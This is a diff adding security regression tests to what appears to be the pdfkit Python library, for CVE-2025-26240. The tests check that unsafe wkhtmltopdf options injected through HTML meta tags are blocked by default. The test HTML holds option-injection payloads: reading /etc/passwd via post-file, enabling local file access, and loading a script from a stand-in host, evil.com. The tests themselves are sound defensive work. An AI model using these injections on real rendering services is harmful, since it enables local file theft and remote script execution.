@@ -492,5 +492,79 @@ class TestPDFKitGeneration(unittest.TestCase):
         output = r.to_pdf()
         self.assertEqual(output[:4].decode('utf-8'), '%PDF')
 
+
+class TestPDFKitSecurity(unittest.TestCase):
+    """Test security-related behavior, particularly CVE-2025-26240"""
+
+    def test_default_meta_tags_behavior_blocks_unsafe_options(self):
+        body = """
+        <html>
+          <head>
+            <meta name='pdfkit-enable-local-file-access' content='' />
+            <meta name='pdfkit-post-file' content='/etc/passwd' />
+            <meta name='pdfkit-script' content='http://evil.com/poc.js' />
+            <meta name='pdfkit-page-size' content='Legal' />
+          </head>
+        </html>
+        """
+        import warnings
+        with warnings.catch_warnings(record=True) as w:
+            warnings.simplefilter("always")
+            r = pdfkit.PDFKit(body, 'string')
+            self.assertTrue(len(w) >= 3)
+            self.assertTrue(any("Blocked unsafe meta tag option: enable-local-file-access" in str(warn.message) for warn in w))
+            self.assertTrue(any("Blocked unsafe meta tag option: post-file" in str(warn.message) for warn in w))
+            self.assertTrue(any("Blocked unsafe meta tag option: script" in str(warn.message) for warn in w))
+
+        cmd = r.command()
+        self.assertNotIn('--enable-local-file-access', cmd)
+        self.assertNotIn('--post-file', cmd)
+        self.assertNotIn('--script', cmd)
+        self.assertIn('--page-size', cmd)
+        self.assertEqual(cmd[cmd.index('--page-size') + 1], 'Legal')
+
+    def test_allow_unsafe_meta_tags_allows_everything(self):
+        body = """
+        <html>
+          <head>
+            <meta name='pdfkit-enable-local-file-access' content='' />
+            <meta name='pdfkit-post-file' content='/etc/passwd' />
+            <meta name='pdfkit-page-size' content='Legal' />
+          </head>
+        </html>
+        """
+        import warnings
+        with warnings.catch_warnings(record=True) as w:
+            warnings.simplefilter("always")
+            r = pdfkit.PDFKit(body, 'string', allow_unsafe_meta_tags=True)
+            self.assertEqual(len([warn for warn in w if "Blocked unsafe meta" in str(warn.message)]), 0)
+
+        cmd = r.command()
+        self.assertIn('--enable-local-file-access', cmd)
+        self.assertIn('--post-file', cmd)
+        self.assertEqual(cmd[cmd.index('--post-file') + 1], '/etc/passwd')
+        self.assertIn('--page-size', cmd)
+        self.assertEqual(cmd[cmd.index('--page-size') + 1], 'Legal')
+
+    def test_from_string_parameter_propagation(self):
+        body = """
+        <html>
+          <head>
+            <meta name='pdfkit-post-file' content='/etc/passwd' />
+          </head>
+        </html>
+        """
+        import warnings
+        with warnings.catch_warnings(record=True) as w:
+            warnings.simplefilter("always")
+            pdfkit.from_string(body, 'out.pdf')
+            self.assertTrue(any("Blocked unsafe meta tag option: post-file" in str(warn.message) for warn in w))
+
+        with warnings.catch_warnings(record=True) as w:
+            warnings.simplefilter("always")
+            pdfkit.from_string(body, 'out.pdf', allow_unsafe_meta_tags=True)
+            self.assertEqual(len([warn for warn in w if "Blocked unsafe meta" in str(warn.message)]), 0)
+
+
 if __name__ == "__main__":
     unittest.main()
